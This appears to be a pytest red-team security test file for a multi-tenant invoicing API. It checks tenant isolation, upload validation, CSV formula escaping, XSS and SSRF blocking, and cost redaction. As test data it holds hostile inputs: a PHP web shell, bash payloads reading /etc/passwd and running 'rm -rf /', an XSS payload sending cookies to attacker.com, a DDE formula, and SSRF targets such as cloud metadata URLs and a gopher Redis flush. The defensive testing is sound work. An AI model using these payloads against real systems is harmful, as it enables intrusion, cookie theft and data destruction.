"""
Vector Red Team: Facturas y Contabilidad (`tests/security_redteam/test_invoices_security.py`):
Auditoría Ofensiva de Ciberseguridad, Aislamiento Multi-Tenant (Anti-IDOR/BOLA),
Validación de Magic Bytes y Bloqueo de Políglotas/Ejecutables,
Prevención de Inyección de Fórmulas CSV (CWE-1236),
Sanitización XSS/SSTI/SQLi en Campos Crudos,
Protección contra SSRF en Webhooks Salientes (CWE-918)
y Cumplimiento RBAC de 3 Niveles con Redacción Física de Costos Confidenciales.
"""
from __future__ import annotations

import io
from datetime import UTC, datetime
from decimal import Decimal
from typing import Any
from unittest.mock import AsyncMock, MagicMock
from uuid import UUID, uuid4

import httpx
import pytest
from fastapi import FastAPI

from src.core.exceptions import SecurityValidationError
from src.core.guards import (
    sanitize_spreadsheet_export_value,
    validate_file_magic_bytes,
    validate_safe_webhook_url,
)
from src.core.security import create_access_token
from src.modules.invoices.application.schemas import (
    InvoiceCreateDTO,
    InvoiceLineItemCreateDTO,
    InvoiceUpdateDTO,
    SupplierAliasCreateDTO,
)
from src.modules.invoices.application.services import DTEExportService
from src.modules.invoices.domain.entities import Invoice, InvoiceLineItem
from src.modules.invoices.domain.value_objects import (
    DTEType,
    InvoiceStatus,
    MatchStatus,
    TaxId,
)
from src.modules.invoices.presentation.router import (
    _check_can_view_costs,
    _entity_to_response_dto,
    get_invoice_service,
    get_supplier_alias_service,
    get_tenant_db,
)

pytestmark = pytest.mark.security_redteam

TENANT_ALPHA = "00000000-0000-0000-0000-000000000001"
TENANT_BETA = "00000000-0000-0000-0000-000000000002"
HOLDING_ID = "00000000-0000-0000-0000-000000000099"


def _make_headers(
    tenant_id: str,
    permissions: list[str],
    user_id: int = 101,
    *,
    explicit_denies: list[str] | None = None,
    can_view_costs: bool | None = None,
) -> dict[str, str]:
    """Genera cabeceras con JWT autenticado y permisos RBAC de 3 niveles."""
    token = create_access_token(
        user_id=user_id,
        tenant_id=tenant_id,
        holding_id=HOLDING_ID,
        role_grants=permissions,
        explicit_denies=explicit_denies or [],
        accessible_tenants=[tenant_id],
        contracted_modules=["contabilidad", "facturas"],
    )
    headers = {
        "Authorization": f"Bearer {token}",
        "X-Tenant-ID": tenant_id,
    }
    return headers


@pytest.fixture
def mock_invoice_service():
    svc = MagicMock()
    svc.list_invoices = AsyncMock()
    svc.get_invoice = AsyncMock()
    svc.create_invoice = AsyncMock()
    svc.update_invoice = AsyncMock()
    svc.delete_invoice = AsyncMock()
    svc.get_dashboard_stats = AsyncMock()
    svc.process_invoice = AsyncMock()
    svc.invoice_repo = MagicMock()
    svc.invoice_repo.save = AsyncMock()
    svc.ingestion_service = MagicMock()
    svc.ingestion_service.auto_ingest_to_inventory = AsyncMock()
    return svc


@pytest.fixture
def mock_alias_service():
    svc = MagicMock()
    svc.learn_alias = AsyncMock()
    svc.alias_repo = MagicMock()
    svc.alias_repo.list_by_supplier = AsyncMock()
    return svc


@pytest.fixture
def mock_db_session():
    session = AsyncMock()
    session.commit = AsyncMock()
    session.rollback = AsyncMock()
    return session


@pytest.fixture(autouse=True)
def override_invoices_security_dependencies(app: FastAPI, mock_invoice_service, mock_alias_service, mock_db_session):
    app.dependency_overrides[get_invoice_service] = lambda: mock_invoice_service
    app.dependency_overrides[get_supplier_alias_service] = lambda: mock_alias_service
    app.dependency_overrides[get_tenant_db] = lambda: mock_db_session
    yield
    app.dependency_overrides.clear()


# ==============================================================================
# VECTOR 1: AISLAMIENTO MULTI-TENANT (BOLA / IDOR)
# ==============================================================================

@pytest.mark.asyncio
async def test_vector_01_cross_tenant_idor_invoice_get_denied(
    async_client: httpx.AsyncClient,
    mock_invoice_service,
) -> None:
    """Verifica que un Tenant Alpha no pueda visualizar por ID la factura del Tenant Beta (BOLA/IDOR)."""
    invoice_beta_id = uuid4()
    mock_invoice_beta = Invoice(
        id=invoice_beta_id,
        tenant_id=TENANT_BETA,  # Factura pertenece a Tenant Beta
        vendor_name="PROVEEDOR CONFIDENCIAL BETA",
        vendor_tax_id=TaxId("76111222-8"),
        invoice_number="FAC-BETA-999",
        net_amount=Decimal("500000.0000"),
        tax_amount=Decimal("95000.0000"),
        total_amount=Decimal("595000.0000"),
        dte_type=DTEType.FACTURA_ELECTRONICA,
        status=InvoiceStatus.APPROVED,
    )
    mock_invoice_service.get_invoice.return_value = mock_invoice_beta

    headers_alpha = _make_headers(TENANT_ALPHA, ["contabilidad.facturas.read"])
    resp = await async_client.get(f"/api/v1/invoices/{invoice_beta_id}", headers=headers_alpha)

    # Debe responder 404 Not Found para no filtrar la existencia del recurso a otro tenant
    assert resp.status_code == 404
    assert f"Factura {invoice_beta_id} no encontrada" in resp.json()["detail"]


@pytest.mark.asyncio
async def test_vector_01_cross_tenant_idor_invoice_update_and_delete_denied(
    async_client: httpx.AsyncClient,
    mock_invoice_service,
) -> None:
    """Verifica que Tenant Alpha no pueda modificar ni borrar facturas del Tenant Beta."""
    invoice_beta_id = uuid4()
    mock_invoice_beta = Invoice(
        id=invoice_beta_id,
        tenant_id=TENANT_BETA,
        vendor_name="PROVEEDOR BETA",
        vendor_tax_id=TaxId("76111222-8"),
        invoice_number="FAC-BETA-01",
        status=InvoiceStatus.PENDING,
    )
    mock_invoice_service.get_invoice.return_value = mock_invoice_beta

    headers_alpha = _make_headers(TENANT_ALPHA, ["contabilidad.facturas.manage"])

    # Intento de modificación cruzada
    put_resp = await async_client.put(
        f"/api/v1/invoices/{invoice_beta_id}",
        headers=headers_alpha,
        json={"vendor_name": "HACKED_BY_ALPHA"},
    )
    assert put_resp.status_code == 404

    # Intento de borrado cruzado
    del_resp = await async_client.delete(f"/api/v1/invoices/{invoice_beta_id}", headers=headers_alpha)
    assert del_resp.status_code == 404


@pytest.mark.asyncio
async def test_vector_01_cross_tenant_file_download_idor_blocked(
    async_client: httpx.AsyncClient,
    mock_invoice_service,
) -> None:
    """Verifica que un Tenant no pueda descargar archivos de facturas de otro Tenant en R2/Storage."""
    inv_id = uuid4()
    mock_inv = Invoice(
        id=inv_id,
        tenant_id=TENANT_BETA,
        vendor_name="PROV BETA",
        vendor_tax_id=TaxId("76111222-8"),
        invoice_number="FAC-BETA-FILE",
        file_path=f"invoices/{TENANT_BETA}/factura_privada.pdf",
        file_name="factura_privada.pdf",
    )
    mock_invoice_service.get_invoice.return_value = mock_inv

    headers_alpha = _make_headers(TENANT_ALPHA, ["contabilidad.facturas.read"])
    dl_resp = await async_client.get(f"/api/v1/invoices/{inv_id}/download", headers=headers_alpha)
    assert dl_resp.status_code == 404


@pytest.mark.asyncio
async def test_vector_01_bulk_operations_cross_tenant_isolation(
    async_client: httpx.AsyncClient,
    mock_invoice_service,
) -> None:
    """Verifica que bulk-process y bulk-delete ignoren silenciosamente IDs pertenecientes a otros tenants."""
    id_alpha = uuid4()
    id_beta = uuid4()

    inv_alpha = Invoice(
        id=id_alpha,
        tenant_id=TENANT_ALPHA,
        vendor_name="PROV A",
        vendor_tax_id=TaxId("76111222-8"),
        invoice_number="FAC-A01",
        status=InvoiceStatus.PENDING,
    )
    inv_beta = Invoice(
        id=id_beta,
        tenant_id=TENANT_BETA,
        vendor_name="PROV B",
        vendor_tax_id=TaxId("76111222-8"),
        invoice_number="FAC-B01",
        status=InvoiceStatus.PENDING,
    )

    async def _get_inv(i_id):
        if i_id == id_alpha:
            return inv_alpha
        if i_id == id_beta:
            return inv_beta
        return None

    mock_invoice_service.get_invoice.side_effect = _get_inv
    mock_invoice_service.delete_invoice.return_value = True

    headers_alpha = _make_headers(TENANT_ALPHA, ["contabilidad.facturas.manage"])

    # Bulk Process: solo debe procesar la factura de Alpha
    resp_proc = await async_client.post(
        "/api/v1/invoices/bulk-process",
        headers=headers_alpha,
        json={"invoice_ids": [str(id_alpha), str(id_beta)], "action": "APPROVE"},
    )
    assert resp_proc.status_code == 200
    assert resp_proc.json()["processed_count"] == 1

    # Bulk Delete: solo debe eliminar la factura de Alpha
    resp_del = await async_client.post(
        "/api/v1/invoices/bulk-delete",
        headers=headers_alpha,
        json={"invoice_ids": [str(id_alpha), str(id_beta)]},
    )
    assert resp_del.status_code == 200
    assert resp_del.json()["deleted_count"] == 1


# ==============================================================================
# VECTOR 2: VALIDACIÓN FÍSICA DE MAGIC BYTES Y RECHAZO DE EJECUTABLES / POLÍGLOTAS
# ==============================================================================

@pytest.mark.parametrize(
    ("fake_content", "filename"),
    [
        (b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff", "factura_camuflada.pdf"),
        (b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00", "recibo.png"),
        (b"#!/bin/bash\ncat /etc/passwd\n", "dte_adjunto.pdf"),
        (b"<?php system($_GET['cmd']); ?>", "boleta.jpg"),
        (b"<script>alert('xss');</script>", "archivo.webp"),
        (b"%PDF-1.4\nvalid pdf body", "factura.pdf.exe"),
    ],
)
def test_vector_02_magic_bytes_guard_blocks_malicious_payloads(
    fake_content: bytes,
    filename: str,
) -> None:
    """Valida que `validate_file_magic_bytes` rechace ejecutables y políglotas en el core guard."""
    with pytest.raises(SecurityValidationError) as exc:
        validate_file_magic_bytes(
            fake_content,
            filename=filename,
            allowed_types={"application/pdf", "image/png", "image/jpeg", "image/webp"},
        )
    assert exc.value.status_code in (400, 422)


@pytest.mark.asyncio
async def test_vector_02_upload_invoice_endpoint_rejects_executable_spoofing(
    async_client: httpx.AsyncClient,
) -> None:
    """Verifica que el endpoint HTTP `/upload` bloquee archivos ejecutables renombrados a PDF con HTTP 400."""
    headers = _make_headers(TENANT_ALPHA, ["contabilidad.facturas.create"])

    # Carga de binario MZ renombrado a factura.pdf
    files = {"file": ("factura.pdf", b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff", "application/pdf")}
    resp = await async_client.post("/api/v1/invoices/upload", headers=headers, files=files)
    assert resp.status_code in (400, 422)
    assert resp.json()["error_code"] == "EXECUTABLE_SPOOFING_BLOCKED"

    # Carga de script bash renombrado a recibo.pdf
    files_sh = {"file": ("recibo.pdf", b"#!/bin/sh\nrm -rf /", "application/pdf")}
    resp_sh = await async_client.post("/api/v1/invoices/upload", headers=headers, files=files_sh)
    assert resp_sh.status_code in (400, 422)
    assert resp_sh.json()["error_code"] == "EXECUTABLE_SPOOFING_BLOCKED"


# ==============================================================================
# VECTOR 3: PREVENCIÓN DE CSV / SPREADSHEET FORMULA INJECTION (CWE-1236)
# ==============================================================================

def test_vector_03_csv_formula_injection_sanitization_in_dte_exports() -> None:
    """
    Verifica que `DTEExportService` sanitice con comilla simple `'` todo campo que inicie
    con `=`, `+`, `-`, `@`, neutralizando vectores de inyección remota DDE en SII, QuickBooks, Xero y Odoo.
    """
    malicious_invoice = Invoice(
        id=uuid4(),
        tenant_id=TENANT_ALPHA,
        vendor_name="=cmd|'/C calc'!A0",
        vendor_tax_id=TaxId("76111222-8"),
        invoice_number="+SUM(1+1)",
        net_amount=Decimal("100.0000"),
        tax_amount=Decimal("19.0000"),
        total_amount=Decimal("119.0000"),
        currency="@USD",
        dte_type=DTEType.FACTURA_ELECTRONICA,
        status=InvoiceStatus.APPROVED,
    )

    # 1. Export SII CSV
    sii_csv = DTEExportService.export_sii_csv([malicious_invoice])
    assert "'=cmd|'/C calc'!A0" in sii_csv
    assert "'+SUM(1+1)" in sii_csv

    # 2. Export QuickBooks CSV
    qb_csv = DTEExportService.export_quickbooks_csv([malicious_invoice])
    assert "'=cmd|'/C calc'!A0" in qb_csv
    assert "'+SUM(1+1)" in qb_csv
    assert "'@USD" in qb_csv

    # 3. Export Xero CSV
    xero_csv = DTEExportService.export_xero_csv([malicious_invoice])
    assert "'=cmd|'/C calc'!A0" in xero_csv
    assert "'+SUM(1+1)" in xero_csv

    # 4. Export Odoo CSV
    odoo_csv = DTEExportService.export_odoo_csv([malicious_invoice])
    assert "'=cmd|'/C calc'!A0" in odoo_csv
    assert "'+SUM(1+1)" in odoo_csv


def test_vector_03_sanitize_spreadsheet_export_value_contract() -> None:
    """Verifica contractualmente la sanitización de prefijos de fórmula en celdas de exportación."""
    assert sanitize_spreadsheet_export_value("=1+1") == "'=1+1"
    assert sanitize_spreadsheet_export_value("+cmd|' /C calc'!A0") == "'+cmd|' /C calc'!A0"
    assert sanitize_spreadsheet_export_value("-100") == "'-100"
    assert sanitize_spreadsheet_export_value("@SUM(A1:B2)") == "'@SUM(A1:B2)"
    assert sanitize_spreadsheet_export_value("Texto Seguro") == "Texto Seguro"


# ==============================================================================
# VECTOR 4: SANITIZACIÓN XSS EN CAMPOS CRUDOS DE FACTURAS Y ALIAS
# ==============================================================================

@pytest.mark.parametrize(
    "xss_payload",
    [
        "<script>alert('xss_attack')</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "javascript:alert(1)",
        "<svg onload=fetch('https://attacker.com/?c='+document.cookie)>",
    ],
)
def test_vector_04_xss_in_invoice_create_dto_blocked(xss_payload: str) -> None:
    """Verifica que `InvoiceCreateDTO` rechace payloads XSS en `vendor_name` y `vendor_address`."""
    with pytest.raises(SecurityValidationError) as exc:
        InvoiceCreateDTO(
            vendor_name=xss_payload,
            vendor_tax_id="76123456-0",
            invoice_number="DOC-01",
        )
    assert exc.value.error_code == "XSS_PAYLOAD_BLOCKED"


@pytest.mark.parametrize(
    "xss_payload",
    [
        "<script>alert('line_xss')</script>",
        "<iframe src='javascript:alert(1)'>",
    ],
)
def test_vector_04_xss_in_line_item_description_blocked(xss_payload: str) -> None:
    """Verifica que descripciones crudas de insumos con XSS sean bloqueadas con HTTP 422."""
    with pytest.raises(SecurityValidationError) as exc:
        InvoiceLineItemCreateDTO(
            raw_description=xss_payload,
            quantity=Decimal("1.0000"),
            unit="kg",
        )
    assert exc.value.error_code == "XSS_PAYLOAD_BLOCKED"


def test_vector_04_xss_in_supplier_alias_dto_blocked() -> None:
    """Verifica que el aprendizaje de alias con XSS en nombre del producto sea bloqueado."""
    with pytest.raises(SecurityValidationError) as exc:
        SupplierAliasCreateDTO(
            raw_vendor_product_name="<script>document.location='http://evil.com'</script>",
            catalog_item_id=uuid4(),
        )
    assert exc.value.error_code == "XSS_PAYLOAD_BLOCKED"


# ==============================================================================
# VECTOR 5: PREVENCIÓN DE SSRF EN WEBHOOKS SALIENTES (CWE-918)
# ==============================================================================

@pytest.mark.parametrize(
    "private_url",
    [
        "http://127.0.0.1:8000/internal-admin",
        "http://localhost:5000/api",
        "http://169.254.169.254/latest/meta-data/",  # AWS Metadata service
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP Metadata service
        "http://10.0.0.1/network-dump",
        "http://192.168.1.1/admin",
        "http://172.16.0.5/secret",
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_flushall",
    ],
)
def test_vector_05_ssrf_validator_blocks_private_targets(private_url: str) -> None:
    """Verifica que `validate_safe_webhook_url` bloquee URLs a redes internas, metadata de cloud y esquemas inseguros."""
    with pytest.raises(SecurityValidationError) as exc:
        validate_safe_webhook_url(private_url)
    assert exc.value.error_code in ("SSRF_TARGET_BLOCKED", "SSRF_FORBIDDEN_SCHEME")


def test_vector_05_ssrf_validator_accepts_legitimate_url() -> None:
    """Verifica que una URL pública válida HTTPS no sea bloqueada."""
    safe_url = "https://hooks.slack.com/services/T00/B00/X00"
    assert validate_safe_webhook_url(safe_url, allow_dns_resolution=False) == safe_url


@pytest.mark.asyncio
async def test_vector_05_webhook_test_endpoint_rejects_ssrf(
    async_client: httpx.AsyncClient,
) -> None:
    """Verifica que el endpoint `/webhooks/test` responda con error al recibir una IP de metadatos o local."""
    headers = _make_headers(TENANT_ALPHA, ["contabilidad.facturas.manage"])
    resp = await async_client.post(
        "/api/v1/invoices/webhooks/test",
        headers=headers,
        json={"webhook_url": "http://169.254.169.254/latest/meta-data/"},
    )
    assert resp.status_code in (400, 422)
    assert resp.json()["error_code"] == "SSRF_TARGET_BLOCKED"


# ==============================================================================
# VECTOR 6: CUMPLIMIENTO RBAC DE 3 NIVELES Y REDACCIÓN FÍSICA DE COSTOS
# ==============================================================================

@pytest.mark.asyncio
async def test_vector_06_rbac_3_level_enforcement(async_client: httpx.AsyncClient) -> None:
    """Verifica que sin los permisos de 3 niveles se niegue el acceso según el principio de mínimo privilegio."""
    # Usuario con permiso de inventario pero SIN permiso de facturas
    unauth_headers = _make_headers(TENANT_ALPHA, ["inventario.bodegas.read"])

    r1 = await async_client.get("/api/v1/invoices", headers=unauth_headers)
    assert r1.status_code == 403

    r2 = await async_client.post(
        "/api/v1/invoices",
        headers=unauth_headers,
        json={"vendor_name": "Test", "vendor_tax_id": "76123456-0", "invoice_number": "1"},
    )
    assert r2.status_code == 403


def test_vector_06_cost_redaction_when_can_view_costs_false() -> None:
    """
    Verifica que al convertir una entidad `Invoice` a `InvoiceResponseDTO`
    con `can_view_costs=False`, todos los montos netos, impuestos, totales y costos de inventario
    sean físicamente redactados a cero (`Decimal('0.0000')`).
    """
    line = InvoiceLineItem(
        id=uuid4(),
        invoice_id=uuid4(),
        line_number=1,
        raw_description="Harina 25kg",
        quantity=Decimal("2.0000"),
        unit="saco",
        unit_price=Decimal("15000.0000"),
        line_total=Decimal("30000.0000"),
        vat_rate=Decimal("19.00"),
        packaging_factor=Decimal("25.0000"),
        packaging_description="Saco 25kg",
        inventory_unit="kg",
        inventory_unit_cost=Decimal("600.0000"),
        match_status=MatchStatus.EXACT_ALIAS,
    )
    line.calculate_stock_and_unit_cost()
    invoice = Invoice(
        id=uuid4(),
        tenant_id=TENANT_ALPHA,
        vendor_name="MOLINO CENTRAL",
        vendor_tax_id=TaxId("76111222-8"),
        invoice_number="FAC-777",
        net_amount=Decimal("30000.0000"),
        tax_amount=Decimal("5700.0000"),
        total_amount=Decimal("35700.0000"),
        gemini_cost_usd=Decimal("0.001500"),
        lines=[line],
    )

    # 1. Con permisos de visualización de costos (can_view_costs=True)
    dto_allowed = _entity_to_response_dto(invoice, can_view_costs=True)
    assert dto_allowed.net_amount == Decimal("30000.0000")
    assert dto_allowed.tax_amount == Decimal("5700.0000")
    assert dto_allowed.total_amount == Decimal("35700.0000")
    assert dto_allowed.lines[0].unit_price == Decimal("15000.0000")
    assert dto_allowed.lines[0].inventory_unit_cost == Decimal("600.0000")

    # 2. Sin permisos de costos (can_view_costs=False) -> Redacción Física Estricta
    dto_redacted = _entity_to_response_dto(invoice, can_view_costs=False)
    assert dto_redacted.net_amount == Decimal("0.0000")
    assert dto_redacted.tax_amount == Decimal("0.0000")
    assert dto_redacted.total_amount == Decimal("0.0000")
    assert dto_redacted.gemini_cost_usd == Decimal("0.000000")
    assert dto_redacted.lines[0].unit_price == Decimal("0.0000")
    assert dto_redacted.lines[0].line_total == Decimal("0.0000")
    assert dto_redacted.lines[0].inventory_unit_cost == Decimal("0.0000")


@pytest.mark.asyncio
async def test_vector_06_cost_redaction_via_explicit_deny(
    async_client: httpx.AsyncClient,
    mock_invoice_service,
) -> None:
    """Verifica que un usuario con denegación explícita de costos reciba los montos redactados vía API."""
    inv_id = uuid4()
    mock_inv = Invoice(
        id=inv_id,
        tenant_id=TENANT_ALPHA,
        vendor_name="PROV CONFIDENCIAL",
        vendor_tax_id=TaxId("76111222-8"),
        invoice_number="FAC-CONF-01",
        net_amount=Decimal("100000.0000"),
        tax_amount=Decimal("19000.0000"),
        total_amount=Decimal("119000.0000"),
    )
    mock_invoice_service.get_invoice.return_value = mock_inv

    # Token con lectura permitida pero denegación explícita de costos
    headers_no_cost = _make_headers(
        TENANT_ALPHA,
        permissions=["contabilidad.facturas.read"],
        explicit_denies=["finanzas.costos.ver", "contabilidad.costos.ver"],
    )

    resp = await async_client.get(f"/api/v1/invoices/{inv_id}", headers=headers_no_cost)
    assert resp.status_code == 200
    data = resp.json()
    assert Decimal(data["total_amount"]) == Decimal("0.0000")
    assert Decimal(data["net_amount"]) == Decimal("0.0000")
    assert Decimal(data["tax_amount"]) == Decimal("0.0000")
